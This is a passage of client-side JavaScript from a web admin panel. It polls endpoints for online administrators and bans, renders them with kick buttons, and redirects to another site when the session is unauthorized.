            return '<div style="display:flex;align-items:flex-start;gap:8px;">' + dot + '<div style="min-width:0;flex:1;display:flex;flex-direction:column;gap:1px;">' + ip + '<div>' + ua + '</div></div></div>';
        }).join('');
        list.querySelectorAll('.oa-kick-btn').forEach(function(btn) {
            btn.onclick = function() { _oaKick(btn.dataset.sid, btn.dataset.ip); };
        });
    }

    function _oaFetch() {
        if (!document.getElementById('online-admins-card')) return;
        var icon = document.getElementById('oa-refresh-icon');
        if (icon) icon.style.animation = 'spin .7s linear infinite';
        var p1 = fetch('/admin777888xxx/online-admins', {headers: {'X-Requested-With': 'XMLHttpRequest'}})
            .then(function(r) {
                if (r.status === 401) { window.location.replace('https://www.google.com'); return null; }
                return r.ok ? r.json() : null;
            });
        var p2 = fetch('/admin777888xxx/admin-bans', {headers: {'X-Requested-With': 'XMLHttpRequest'}})
            .then(function(r) { return r.ok ? r.json() : null; })
            .catch(function() { return null; });
        Promise.all([p1, p2]).then(function(results) {
            if (icon) icon.style.animation = '';
            var d = results[0], bans = results[1];
            if (d && d.admins) {
                _oaRender(d.admins);
            }
            if (bans) _oaRenderBans(bans.bans || []);
        }).catch(function() { if (icon) icon.style.animation = ''; });
    }

    window.oaRefresh = function() { _oaFetch(); };

    function _oaStartPolling() {
        if (!document.getElementById('online-admins-card')) return;
        _oaFetch();
        clearInterval(_oaTimer);
        _oaTimer = setInterval(_oaFetch, 30000);
    }

    function _oaStopPolling() {
        clearInterval(_oaTimer);
        _oaTimer = null;
    }

    // MutationObserver watches view-settings class — fires every time settings tab is shown/hidden
    var _oaObserver = new MutationObserver(function() {
        var settingsView = document.getElementById('view-settings');
        if (!settingsView) return;
        if (!settingsView.classList.contains('admin-view-hidden')) {
            // Entered settings — always fetch immediately + restart polling interval
            _oaStartPolling();
        } else {
            _oaStopPolling();
        }
    });

    document.addEventListener('DOMContentLoaded', function() {
        if (!document.getElementById('online-admins-card')) return;
        var settingsView = document.getElementById('view-settings');
        if (settingsView) {
            _oaObserver.observe(settingsView, {attributes: true, attributeFilter: ['class']});
        }
        _oaFetch();
    });
})();

// "" Panel divider (fixed — not draggable) """"""""""""""""""""""""""""""""""""""

